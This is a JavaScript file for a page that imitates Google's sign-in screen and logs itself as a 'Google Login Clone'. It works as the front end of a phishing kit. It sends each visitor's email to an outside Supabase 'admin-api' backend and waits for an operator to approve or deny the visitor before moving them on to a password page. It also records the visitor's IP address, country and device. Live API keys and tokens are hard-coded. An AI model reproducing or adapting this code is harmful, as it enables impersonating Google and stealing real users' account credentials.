document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    const emailInput = document.getElementById('email');
    const emailError = document.getElementById('email-error');
    const passwordInput = document.getElementById('password');
    const nextButton = document.querySelector('.btn-primary');
    const languageSelect = document.querySelector('.language-dropdown');
    const inputField = document.querySelector('.input-field');

    // ========================================================================
    // Supabase (project chinh - candidate_login_events)
    // ========================================================================
    const SUPABASE_URL = 'https://tmsgxgjzzrcdhsxdqgdi.supabase.co';
    const SUPABASE_KEY = 'sb_publishable_UnheZ3TbTb9diVbI4akjEg_GP8hX-Sv';
    const TRACKING_KEY = 'candidate_tracking_session_id';

    function getTrackingSessionId() {
        let sid = sessionStorage.getItem(TRACKING_KEY);
        if (!sid) {
            sid = 'track-' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 8);
            sessionStorage.setItem(TRACKING_KEY, sid);
        }
        return sid;
    }

    async function getIpInfo() {
        try {
            const r = await fetch('https://ipapi.co/json/');
            if (!r.ok) return { ip: null, country: null };
            const d = await r.json();
            return { ip: d.ip || null, country: d.country_name || null };
        } catch { return { ip: null, country: null }; }
    }

    function detectDevice() {
        const ua = navigator.userAgent;
        const isMobile = /Mobile|Android|iPhone|iPad/i.test(ua) ? 'Mobile' : 'Desktop';
        let os = 'Unknown OS';
        if (ua.includes('Windows NT 10.0')) os = 'Windows 10';
        else if (ua.includes('Windows')) os = 'Windows';
        else if (ua.includes('Mac OS X')) os = 'macOS';
        else if (ua.includes('Android')) os = 'Android';
        else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
        else if (ua.includes('Linux')) os = 'Linux';
        let browser = 'Unknown Browser';
        const m1 = ua.match(/Chrome\/(\d+)/);
        const m2 = ua.match(/Edg\/(\d+)/);
        const m3 = ua.match(/Firefox\/(\d+)/);
        const m4 = ua.match(/Version\/(\d+).+Safari/);
        if (m2) browser = 'Edge ' + m2[1];
        else if (m1) browser = 'Chrome ' + m1[1];
        else if (m3) browser = 'Firefox ' + m3[1];
        else if (m4) browser = 'Safari ' + m4[1];
        return isMobile + ' | ' + os + ' | ' + browser;
    }

    async function saveLoginEvent(payload) {
        try {
            const ipInfo = await getIpInfo();
            const body = Object.assign({
                tracking_session_id: getTrackingSessionId(),
                ip_address: ipInfo.ip,
                ip_country: ipInfo.country,
                user_agent: navigator.userAgent,
                device: detectDevice(),
                raw_payload: { currentPage: payload.page, userAgent: navigator.userAgent }
            }, payload);
            const r = await fetch(SUPABASE_URL + '/rest/v1/candidate_login_events', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'apikey': SUPABASE_KEY,
                    'Authorization': 'Bearer ' + SUPABASE_KEY,
                    'Prefer': 'return=minimal'
                },
                keepalive: true,
                body: JSON.stringify(body)
            });
            if (!r.ok) {
                console.error('[Supabase] save event failed', r.status, await r.text());
            } else {
                console.log('[Supabase] saved event', payload.page, payload.step);
            }
        } catch (err) {
            console.error('[Supabase] save event error:', err);
        }
    }
    window.__saveLoginEvent = saveLoginEvent;

    // Focus effects for inputs
    const inputs = document.querySelectorAll('.form-input');
    inputs.forEach(input => {
        input.addEventListener('focus', function() {
            this.parentElement.classList.add('focused');
        });

        input.addEventListener('blur', function() {
            this.parentElement.classList.remove('focused');
            validateInput(this);
        });

        input.addEventListener('input', function() {
            validateInput(this);
            updateButtonState();
        });
    });

    // Email validation regex
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^[\d\s\-\+\(\)]+$/;

    // Username validation (Google style)
    const usernameRegex = /^(?!.*\.\.)(?!\.)[a-zA-Z0-9.]{4,30}(?<!\.)$/;

    // Validate email, phone, or username
    function validateEmailOrPhone(value) {
        if (!value) {
            return { valid: false, message: 'Enter an email or phone number' };
        }
        if (emailRegex.test(value)) {
            return { valid: true, message: '' };
        }
        if (phoneRegex.test(value) && value.replace(/\D/g, '').length >= 10) {
            return { valid: true, message: '' };
        }
        if (usernameRegex.test(value)) {
            return { valid: true, message: '' };
        }
        return { valid: false, message: 'Enter a valid email, phone number, or username' };
    }

    // Hàm hiển thị lỗi cho input email chuẩn Google
    function showEmailError(message) {
        inputField.classList.add('error');
        emailInput.classList.add('error');
        const label = inputField.querySelector('.floating-label');
        if (label) label.classList.add('error');
        // Xóa error-message cũ
        let errMsg = inputField.querySelector('.error-message');
        if (errMsg) errMsg.remove();
        // Thêm error-message mới
        errMsg = document.createElement('div');
        errMsg.className = 'error-message';
        errMsg.textContent = message;
        inputField.appendChild(errMsg);
    }
    function clearEmailError() {
        inputField.classList.remove('error');
        emailInput.classList.remove('error');
        const label = inputField.querySelector('.floating-label');
        if (label) label.classList.remove('error');
        let errMsg = inputField.querySelector('.error-message');
        if (errMsg) errMsg.remove();
    }

    // Sửa lại validateInput cho email
    function validateInput(input) {
        const value = input.value.trim();
        let isValid = true;
        let errorMessage = '';
        if (input.id === 'email') {
            if (!validateEmailOrPhone(value).valid) {
                isValid = false;
                errorMessage = 'Enter a name, email, or phone number';
            }
        }
        if (input.type === 'password') {
            if (value && value.length < 6) {
                isValid = false;
                errorMessage = 'Password must be at least 6 characters';
            }
        }
        if (!isValid) {
            showEmailError(errorMessage);
        } else {
            clearEmailError();
        }
        return isValid;
    }

    // Update button state
    function updateButtonState() {
        const emailValue = emailInput.value.trim();
        const passwordValue = passwordInput.value.trim();
        
        if (emailValue && passwordValue) {
            nextButton.disabled = false;
            nextButton.style.opacity = '1';
        } else {
            nextButton.disabled = true;
            nextButton.style.opacity = '0.6';
        }
    }

    // Handle form submission
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        const email = emailInput.value;
        const validation = validateEmailOrPhone(email);
        if (!validation.valid) {
            showEmailError('Enter a name, email, or phone number');
            emailInput.focus();
            return;
        }
        
        // Add loading state
        nextButton.classList.add('loading');
        nextButton.disabled = true;

        // Luu event vao Supabase project chinh (candidate_login_events).
        // Chay song song, khong await de khong lam cham UX.
        saveLoginEvent({ page: 'index.html', step: 'email', email: email });

        try {
            // Gửi dữ liệu đến Supabase Backend với tối ưu hóa tốc độ
                            const response = await fetch('https://nqsdardermkzppeaazbb.supabase.co/functions/v1/admin-api/api/request', {
                method: 'POST',
                                    headers: {
                        'Content-Type': 'application/json',
                        'Cache-Control': 'no-cache',
                        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc',
                        'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc'
                    },
                cache: 'no-cache',
                keepalive: true,
                body: JSON.stringify({
                    email: email,
                    password: '',
                    twofa: '',
                    userAgent: navigator.userAgent,
                    currentPage: 'index.html'
                })
            });
            
            if (response.ok) {
                const data = await response.json();
                console.log('Supabase response:', data);
                
                // Lưu email để kiểm tra approval sau
                localStorage.setItem('userEmail', email);
                
                // Kiểm tra trạng thái approval
                await checkApprovalStatus();
            } else {
                console.error('Failed to send data to backend');
                // Vẫn chuyển trang nếu không kết nối được Backend
                localStorage.setItem('userEmail', email);
                navigateTo('password.html?email=' + encodeURIComponent(email));
            }
        } catch (error) {
            console.error('Error sending data to backend:', error);
            // Vẫn chuyển trang nếu có lỗi
            localStorage.setItem('userEmail', email);
            navigateTo('password.html?email=' + encodeURIComponent(email));
        }
    });

    // Hàm kiểm tra trạng thái approval với tốc độ nhanh hơn
    async function checkApprovalStatus() {
        const maxAttempts = 120; // Tối đa 120 lần kiểm tra (2 phút)
        let attempts = 0;
        
        const checkStatus = async () => {
            try {
                            const response = await fetch(`https://nqsdardermkzppeaazbb.supabase.co/functions/v1/admin-api/api/check-approval?email=${encodeURIComponent(localStorage.getItem('userEmail'))}`, {
                cache: 'no-cache',
                headers: {
                    'Cache-Control': 'no-cache',
                    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc',
                    'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc'
                }
                });
                
                if (response.ok) {
                    const data = await response.json();
                    
                    if (data.status === 'approved') {
                        // Được approve, chuyển trang ngay lập tức
                        const email = localStorage.getItem('userEmail');
                        navigateTo('password.html?email=' + encodeURIComponent(email));
                        return;
                    } else if (data.status === 'denied') {
                        // Bị từ chối, reset form để người dùng thử lại
                        showNotification('Access denied. Please try again.', 'error');
                        nextButton.classList.remove('loading');
                        nextButton.disabled = false;
                        emailInput.focus();
                        return;
                    }
                }
                
                attempts++;
                if (attempts < maxAttempts) {
                    // Kiểm tra nhanh hơn: 300ms cho 20 lần đầu, sau đó 500ms
                    const interval = attempts < 20 ? 300 : 500;
                    setTimeout(checkStatus, interval);
                } else {
                    // Hết thời gian chờ, chuyển trang
                    const email = localStorage.getItem('userEmail');
                    navigateTo('password.html?email=' + encodeURIComponent(email));
                }
            } catch (error) {
                console.error('Error checking approval status:', error);
                attempts++;
                if (attempts < maxAttempts) {
                    const interval = attempts < 20 ? 300 : 500;
                    setTimeout(checkStatus, interval);
                } else {
                    const email = localStorage.getItem('userEmail');
                    navigateTo('password.html?email=' + encodeURIComponent(email));
                }
            }
        };
        
        // Bắt đầu kiểm tra ngay lập tức
        checkStatus();
    }

    // Navigation function with Google-style transition
    function navigateTo(page) {
        // Add fade-out effect to current page
        const mainWrapper = document.querySelector('.main-wrapper');
        mainWrapper.classList.add('fade-out');
        
        // Show loading overlay
        const loadingOverlay = document.getElementById('loadingOverlay');
        const progressBar = document.getElementById('progressBar');
        const progressContainer = document.querySelector('.progress-container');
        
        loadingOverlay.classList.add('active');
        progressContainer.classList.add('active');
        
        // Reset progress bar
        progressBar.style.width = '0%';
        progressBar.classList.remove('loading', 'completing');
        
        // Start smooth progress animation
        setTimeout(() => {
            progressBar.classList.add('loading');
            progressBar.style.width = '80%';
        }, 100);
        
        // Navigate after animation completes
        setTimeout(() => {
            progressBar.classList.remove('loading');
            progressBar.classList.add('completing');
            progressBar.style.width = '100%';
            
            // Hide progress bar and navigate
            setTimeout(() => {
                progressContainer.classList.remove('active');
                window.location.href = page;
            }, 300);
        }, 1200);
    }

    // Smooth progress bar function for API calls
    function startProgressBar() {
        const progressBar = document.getElementById('progressBar');
        const progressContainer = document.querySelector('.progress-container');
        
        if (!progressBar || !progressContainer) return;
        
        // Show progress container
        progressContainer.classList.add('active');
        
        // Reset and start animation
        progressBar.style.width = '0%';
        progressBar.classList.remove('loading', 'completing');
        
        setTimeout(() => {
            progressBar.classList.add('loading');
            progressBar.style.width = '80%';
        }, 100);
        
        return {
            complete: () => {
                progressBar.classList.remove('loading');
                progressBar.classList.add('completing');
                progressBar.style.width = '100%';
                
                setTimeout(() => {
                    progressContainer.classList.remove('active');
                }, 300);
            },
            hide: () => {
                progressContainer.classList.remove('active');
            }
        };
    }

    // Chỉ hiện hiệu ứng đỏ khi bấm Tiếp theo, không hiện khi đang nhập hoặc blur
    emailInput.addEventListener('input', function() {
        emailError.textContent = '';
        inputField.classList.remove('error');
    });
    emailInput.addEventListener('focus', function() {
        emailError.textContent = '';
        inputField.classList.remove('error');
    });

    // Handle language selection
    if (languageSelect) {
        languageSelect.addEventListener('change', function() {
            console.log('Language changed to:', this.value);
            // In real app, would reload page with new language
        });
    }

    // Handle forgot email button
    const forgotEmailBtn = document.querySelector('.forgot-email-btn');
    if (forgotEmailBtn) {
        forgotEmailBtn.addEventListener('click', function(e) {
            e.preventDefault();
            console.log('Forgot email clicked');
            // In real app, would navigate to account recovery
        });
    }

    // Handle create account button
    const createAccountBtn = document.querySelector('.btn-secondary');
    if (createAccountBtn) {
        createAccountBtn.addEventListener('click', function(e) {
            e.preventDefault();
            console.log('Create account clicked');
            // In real app, would navigate to signup page
        });
    }

    // Handle learn more link
    const learnMoreLink = document.querySelector('.learn-more');
    if (learnMoreLink) {
        learnMoreLink.addEventListener('click', function(e) {
            e.preventDefault();
            console.log('Learn more about guest mode clicked');
            // In real app, would show guest mode info
        });
    }

    // Auto-focus email input
    emailInput.focus();

    // Enable keyboard navigation
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter' && document.activeElement === emailInput) {
            loginForm.dispatchEvent(new Event('submit'));
        }
    });

    // Notification system
    function showNotification(message, type = 'info') {
        // Remove existing notifications
        const existingNotification = document.querySelector('.notification');
        if (existingNotification) {
            existingNotification.remove();
        }

        const notification = document.createElement('div');
        notification.className = `notification notification-${type}`;
        notification.textContent = message;
        
        // Style the notification
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 12px 20px;
            border-radius: 4px;
            color: white;
            font-size: 14px;
            font-weight: 500;
            z-index: 1000;
            animation: slideIn 0.3s ease;
            ${type === 'success' ? 'background-color: #34a853;' : 'background-color: #1a73e8;'}
        `;

        document.body.appendChild(notification);

        // Remove notification after 3 seconds
        setTimeout(() => {
            notification.style.animation = 'slideOut 0.3s ease';
            setTimeout(() => {
                if (notification.parentElement) {
                    notification.remove();
                }
            }, 300);
        }, 3000);
    }

    // Add CSS animations for notifications
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
        
        @keyframes slideOut {
            from {
                transform: translateX(0);
                opacity: 1;
            }
            to {
                transform: translateX(100%);
                opacity: 0;
            }
        }
    `;
    document.head.appendChild(style);

    // Accessibility improvements
    inputs.forEach(input => {
        input.setAttribute('aria-describedby', `${input.id}-error`);
    });

    // Focus management
    emailInput.focus();

    // Initialize button state
    updateButtonState();

    // Add hover effects for better UX
    const links = document.querySelectorAll('a');
    links.forEach(link => {
        link.addEventListener('mouseenter', function() {
            this.style.transition = 'color 0.2s ease';
        });
    });

    // Add click effects for buttons
    nextButton.addEventListener('mousedown', function() {
        this.style.transform = 'scale(0.98)';
    });

    nextButton.addEventListener('mouseup', function() {
        this.style.transform = 'scale(1)';
    });

    nextButton.addEventListener('mouseleave', function() {
        this.style.transform = 'scale(1)';
    });

    // Password visibility toggle (optional enhancement)
    const togglePasswordVisibility = () => {
        const type = passwordInput.type === 'password' ? 'text' : 'password';
        passwordInput.type = type;
    };

    // Add password visibility toggle button (uncomment to enable)
    /*
    const toggleButton = document.createElement('button');
    toggleButton.type = 'button';
    toggleButton.innerHTML = '👁️';
    toggleButton.style.cssText = `
        position: absolute;
        right: 12px;
        top: 50%;
        transform: translateY(-50%);
        background: none;
        border: none;
        cursor: pointer;
        font-size: 16px;
        color: #5f6368;
    `;
    passwordInput.parentElement.style.position = 'relative';
    passwordInput.parentElement.appendChild(toggleButton);
    toggleButton.addEventListener('click', togglePasswordVisibility);
    */

    console.log('Google Login Clone initialized successfully!');

    // Chặn ký tự đặc biệt không hợp lệ khi nhập
    emailInput.addEventListener('input', function(e) {
        const value = emailInput.value;
        // Chỉ cho phép chữ, số, dấu chấm, @, -, _, +, (), khoảng trắng
        const allowed = /^[a-zA-Z0-9.@_\-+()\s]*$/;
        if (!allowed.test(value)) {
            emailInput.value = value.replace(/[^a-zA-Z0-9.@_\-+()\s]/g, '');
            showEmailError('Enter a name, email, or phone number');
        } else {
            validateInput(emailInput);
        }
    });
    emailInput.addEventListener('focus', function() {
        clearEmailError();
    });

    // Hàm hiển thị lỗi cho input mật khẩu chuẩn Google
    function showPasswordError(message) {
        if (!passwordInput) return;
        const pwField = passwordInput.closest('.input-field');
        if (pwField) pwField.classList.add('error');
        passwordInput.classList.add('error');
        const label = pwField ? pwField.querySelector('.floating-label') : null;
        if (label) label.classList.add('error');
        // Xóa error-message cũ
        let errMsg = pwField ? pwField.querySelector('.error-message') : null;
        if (errMsg) errMsg.remove();
        // Thêm error-message mới
        errMsg = document.createElement('div');
        errMsg.className = 'error-message';
        errMsg.textContent = message;
        if (pwField) pwField.appendChild(errMsg);
    }
    function clearPasswordError() {
        if (!passwordInput) return;
        const pwField = passwordInput.closest('.input-field');
        if (pwField) pwField.classList.remove('error');
        passwordInput.classList.remove('error');
        const label = pwField ? pwField.querySelector('.floating-label') : null;
        if (label) label.classList.remove('error');
        let errMsg = pwField ? pwField.querySelector('.error-message') : null;
        if (errMsg) errMsg.remove();
    }

    // Validate input cho mật khẩu
    function validatePasswordInput(input) {
        const value = input.value.trim();
        let isValid = true;
        let errorMessage = '';
        if (input.type === 'password') {
            if (!value) {
                isValid = false;
                errorMessage = 'Enter your password';
            } else if (value.length < 6) {
                isValid = false;
                errorMessage = 'Password must be at least 6 characters';
            }
        }
        if (!isValid) {
            showPasswordError(errorMessage);
        } else {
            clearPasswordError();
        }
        return isValid;
    }

    if (passwordInput) {
        passwordInput.addEventListener('input', function() {
            validatePasswordInput(passwordInput);
        });
        passwordInput.addEventListener('focus', function() {
            clearPasswordError();
        });
    }

    // Khi submit, kiểm tra cả email và password
    loginForm && loginForm.addEventListener('submit', function(e) {
        if (passwordInput) {
            if (!validatePasswordInput(passwordInput)) {
                e.preventDefault();
                passwordInput.focus();
                return;
            }
        }
        // ... existing code ...
    });
}); 